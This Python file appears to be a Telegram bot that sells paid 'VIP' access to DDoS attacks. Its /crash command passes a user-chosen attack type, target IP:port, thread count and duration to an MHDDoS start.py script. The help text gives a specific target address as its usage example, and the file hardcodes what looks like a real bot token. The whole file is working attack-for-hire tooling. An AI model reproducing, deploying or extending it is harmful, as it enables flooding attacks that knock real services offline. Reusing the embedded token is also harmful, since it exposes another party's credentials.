import telebot
import subprocess
import sqlite3
from datetime import datetime, timedelta
from threading import Lock
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

BOT_TOKEN = "7874705308:AAGEeOTipFJMjq9JwBod16jZ1rE0xELukOQ"
ADMIN_ID = 6320028017
START_PY_PATH = "/workspaces/MHDDoS/start.py"

bot = telebot.TeleBot(BOT_TOKEN)
db_lock = Lock()
cooldowns = {}
active_attacks = {}

conn = sqlite3.connect("users.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute(
    """
    CREATE TABLE IF NOT EXISTS vip_users (
        id INTEGER PRIMARY KEY,
        telegram_id INTEGER UNIQUE,
        expiration_date TEXT
    )
    """
)
conn.commit()


@bot.message_handler(commands=["start"])
def handle_start(message):
    telegram_id = message.from_user.id

    with db_lock:
        cursor.execute(
            "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
            (telegram_id,),
        )
        result = cursor.fetchone()


    if result:
        expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
        if datetime.now() > expiration_date:
            vip_status = "✘ *𝘙𝘦𝘯𝘤𝘢𝘯𝘢 𝘝𝘪𝘱 𝘈𝘯𝘥𝘢 𝘛𝘦𝘭𝘢𝘩 𝘒𝘢𝘥𝘢𝘭𝘶𝘢𝘳𝘴𝘢.*"
        else:
            dias_restantes = (expiration_date - datetime.now()).days
            vip_status = (
                f"♛ 𝙋𝙚𝙡𝙖𝙣𝙜𝙜𝙖𝙣 𝙑𝙄𝙋!\n"
                f"♟ 𝙃𝙖𝙧𝙞 𝙔𝙖𝙣𝙜 𝙏𝙚𝙧𝙨𝙞𝙨𝙖: {dias_restantes} dia(s)\n"
                f"♞ 𝙃𝙖𝙗𝙞𝙨 𝙈𝙖𝙨𝙖 𝘽𝙚𝙧𝙡𝙖𝙠𝙪: {expiration_date.strftime('%d/%m/%Y %H:%M:%S')}"
            )
    else:
        vip_status = "✘ *𝘼𝙣𝙙𝙖 𝙏𝙞𝙙𝙖𝙠 𝙈𝙚𝙢𝙞𝙡𝙞𝙠𝙞 𝙋𝙖𝙠𝙚𝙩 𝙑𝙄𝙋 𝘼𝙠𝙩𝙞𝙛.*"
    markup = InlineKeyboardMarkup()
    button = InlineKeyboardButton(
        text="⌘ 𝘋𝘢𝘯𝘴𝘴𝘙𝘮𝘥𝘯_ ⌘",
        url=f"tg://user?id={ADMIN_ID}"

    )
    markup.add(button)
    
    bot.reply_to(
        message,
        (
            "☣ *𝐃𝐃𝐎𝐒 𝐒𝐄𝐑𝐕𝐄𝐑 𝐒𝐈𝐆𝐍𝐀𝐋 𝟗𝟗𝟗+*"
            

            f"""
```
{vip_status}```\n"""
            "♛ *𝘊𝘢𝘳𝘢 𝘔𝘦𝘯𝘨𝘨𝘶𝘯𝘢𝘬𝘢𝘯 𝘉𝘳𝘰𝘰:*"
            """
__/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>__\n"""
            "♚ *𝘊𝘰𝘯𝘵𝘰𝘩:*"
            """
__/crash UDP 124.158.135.39:10016 10 900__\n"""
            "☛ 𝘋𝘢𝘯𝘴𝘴𝘙𝘮𝘥𝘯_ ☹☠︎︎  𝙋𝙀𝙉𝙂𝙂𝙐𝙉𝘼 𝙑𝙑𝙄𝙋 ☚"
        ),
        reply_markup=markup,
        parse_mode="Markdown",
    )


@bot.message_handler(commands=["vip"])
def handle_addvip(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "✘ 𝘼𝙣𝙙𝙖 𝘽𝙪𝙠𝙖𝙣 𝙋𝙚𝙣𝙟𝙪𝙖𝙡 𝙍𝙚𝙨𝙢𝙞, 𝙃𝙖𝙝𝙖𝙝𝙖 𝙇𝙖𝙬𝙖𝙠 𝙇𝙤🗿😂 𝙃𝙪𝙗𝙪𝙣𝙜𝙞 @Danssrmdn.")
        return

    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(
            message,
            "✘ 𝙁𝙤𝙧𝙢𝙖𝙩 𝙏𝙞𝙙𝙖𝙠 𝙑𝙖𝙡𝙞𝙙. 𝙂𝙪𝙣𝙖𝙠𝙖𝙣: `/vip <ID> <QUANTOS DIAS>`",
            parse_mode="Markdown",
        )
        return

    telegram_id = args[1]
    days = int(args[2])
    expiration_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")

    with db_lock:
        cursor.execute(
            """
            INSERT OR REPLACE INTO vip_users (telegram_id, expiration_date)
            VALUES (?, ?)
            """,
            (telegram_id, expiration_date),
        )
        conn.commit()

    bot.reply_to(message, f" ✔ 𝙋𝙚𝙣𝙜𝙜𝙪𝙣𝙖 {telegram_id} 𝘿𝙞 𝙏𝙖𝙢𝙗𝙖𝙝𝙠𝙖𝙣 𝙎𝙚𝙗𝙖𝙜𝙖𝙞 𝙑𝙞𝙥 𝙎𝙚𝙡𝙖𝙢𝙖 {days} 𝙃𝙖𝙧𝙞.")


@bot.message_handler(commands=["crash"])
def handle_ping(message):
    telegram_id = message.from_user.id

    with db_lock:
        cursor.execute(
            "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
            (telegram_id,),
        )
        result = cursor.fetchone()

    if not result:
        bot.reply_to(message, "✘ 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖 𝙖𝙣𝙟? 𝘈𝘯𝘥𝘢 𝘛𝘪𝘥𝘢𝘬 𝘔𝘦𝘮𝘪𝘭𝘪𝘬𝘪 𝘐𝘫𝘪𝘯 𝘔𝘦𝘯𝘨𝘨𝘶𝘯𝘢𝘬𝘢𝘯 𝘗𝘦𝘳𝘪𝘯𝘵𝘢𝘩 𝘐𝘯𝘪 𝘏𝘶𝘣𝘶𝘯𝘨𝘪 @Danssrmdn.")
        return

    expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
    if datetime.now() > expiration_date:
        bot.reply_to(message, "✘ 𝘼𝙠𝙨𝙚𝙨 𝙑𝙞𝙥 𝘼𝙣𝙙𝙖 𝙏𝙚𝙡𝙖𝙝 𝙆𝙖𝙙𝙖𝙡𝙪𝙖𝙧𝙨𝙖 😂. 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙣𝙙𝙖𝙥𝙖𝙩𝙠𝙖𝙣 𝘼𝙠𝙨𝙚𝙨 𝙑𝙞𝙥 𝙇𝙖𝙜𝙞? 𝙃𝙪𝙗𝙪𝙣𝙜𝙞 @Danssrmdn")
        return

    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 10:
        bot.reply_to(message, "✘ 𝙏𝙪𝙣𝙜𝙜𝙪 10 𝘿𝙚𝙩𝙞𝙠 𝙎𝙚𝙗𝙚𝙡𝙪𝙢 𝙈𝙚𝙢𝙪𝙡𝙖𝙞 𝙎𝙚𝙧𝙖𝙣𝙜𝙖𝙣 𝙇𝙖𝙞𝙣 𝘿𝙖𝙣 𝙄𝙣𝙜𝙖𝙩𝙡𝙖𝙝 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙣𝙜𝙝𝙚𝙣𝙩𝙞𝙠𝙖𝙣 𝙎𝙚𝙧𝙖𝙣𝙜𝙖𝙣 𝙎𝙚𝙗𝙚𝙡𝙪𝙢𝙣𝙮𝙖.")
        return

    args = message.text.split()
    if len(args) != 5 or ":" not in args[2]:
        bot.reply_to(
            message,
            (
                "✘ *𝙁𝙤𝙧𝙢𝙖𝙩 𝙏𝙞𝙙𝙖𝙠 𝙑𝙖𝙡𝙞𝙙 𝘼𝙣𝙟🗿!*\n\n"
                "♛ *𝙋𝙚𝙣𝙜𝙜𝙪𝙣𝙖𝙖𝙣 𝙔𝙖𝙣𝙜 𝘽𝙚𝙣𝙖𝙧:*\n"
                "`/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>`\n\n"
                "♚ *𝘾𝙤𝙣𝙩𝙤𝙝:*\n"
                "`/crash UDP 124.158.135.39:10016 10 900`"
            ),
            parse_mode="Markdown",
        )
        return

    attack_type = args[1]
    ip_port = args[2]
    threads = args[3]
    duration = args[4]
    command = ["python", START_PY_PATH, attack_type, ip_port, threads, duration]

    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    active_attacks[telegram_id] = process
    cooldowns[telegram_id] = time.time()

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🛑✋ 𝙃𝙚𝙣𝙩𝙞𝙠𝙖𝙣 𝙎𝙚𝙧𝙖𝙣𝙜𝙖𝙣 𝘾𝙤𝙠 𝘼𝙨𝙪𝙞", callback_data=f"stop_{telegram_id}"))

    bot.reply_to(
        message,
        (
            "*[🚀] 𝙎𝙀𝙍𝘼𝙉𝙂𝘼𝙉 𝘿𝙄 𝙈𝙐𝙇𝘼𝙄 - 999+ [🚀]*\n\n"
            f"ᯤ *𝘼𝙡𝙖𝙢𝙖𝙩 𝙄𝙥&𝙋𝙤𝙧𝙩:* {ip_port}\n"
            f"⚙︎ *𝙏𝙞𝙥𝙚 𝙎𝙚𝙧𝙖𝙣𝙜𝙖𝙣:* {attack_type}\n"
            f"×͜× *𝙏𝙝𝙧𝙚𝙖𝙙𝙨:* {threads}\n"
            f"⏱ *𝙒𝙖𝙠𝙩𝙪 𝙎𝙚𝙧𝙖𝙣𝙜𝙖𝙣 (ms):* {duration}\n\n"
            f"☛ 𝘋𝘢𝘯𝘴𝘴𝘙𝘮𝘥𝘯_ ☹☠︎︎  𝙋𝙀𝙉𝙂𝙂𝙐𝙉𝘼 𝙑𝙑𝙄𝙋 ☚"
        ),
        reply_markup=markup,
        parse_mode="Markdown",
    )


@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def handle_stop_attack(call):
    telegram_id = int(call.data.split("_")[1])

    if call.from_user.id != telegram_id:
        bot.answer_callback_query(
            call.id, "✘ 𝙃𝙖𝙣𝙮𝙖 𝙋𝙚𝙣𝙜𝙜𝙪𝙣𝙖 𝙔𝙖𝙣𝙜 𝘿𝙖𝙥𝙖𝙩 𝙈𝙚𝙢𝙪𝙡𝙖𝙞 𝙏𝙞𝙣𝙙𝙖𝙠𝙖𝙣/𝙔𝙖𝙣𝙜 𝘽𝙞𝙨𝙖 𝙈𝙚𝙡𝙖𝙠𝙪𝙠𝙖𝙣𝙣𝙮𝙖."
        )
        return

    if telegram_id in active_attacks:
        process = active_attacks[telegram_id]
        process.terminate()
        del active_attacks[telegram_id]

        bot.answer_callback_query(call.id, " ✔ 𝙎𝙀𝙍𝘼𝙉𝙂𝘼𝙉 𝘽𝙀𝙍𝙃𝘼𝙎𝙄𝙇 𝘿𝙄 𝙃𝙀𝙉𝙏𝙄𝙆𝘼𝙉.")
        bot.edit_message_text(
            "*[⚠] 𝙎𝙀𝙍𝘼𝙉𝙂𝘼𝙉 𝙎𝙀𝙇𝙀𝙎𝘼𝙄[⚠]*",
            chat_id=call.message.chat.id,
            message_id=call.message.id,
            parse_mode="Markdown",
        )
        time.sleep(3)
        bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)
    else:
        bot.answer_callback_query(call.id, "✘ 𝙏𝙞𝙙𝙖𝙠 𝘼𝙙𝙖 𝙎𝙚𝙧𝙖𝙣𝙜𝙖𝙣 𝙔𝙖𝙣𝙜 𝙙𝙞 𝙏𝙚𝙢𝙪𝙠𝙖𝙣, 𝙇𝙖𝙣𝙟𝙪𝙩𝙠𝙖𝙣 𝙏𝙞𝙣𝙙𝙖𝙠𝙖𝙣 𝘼𝙣𝙙𝙖.")

if __name__ == "__main__":
    bot.infinity_polling()
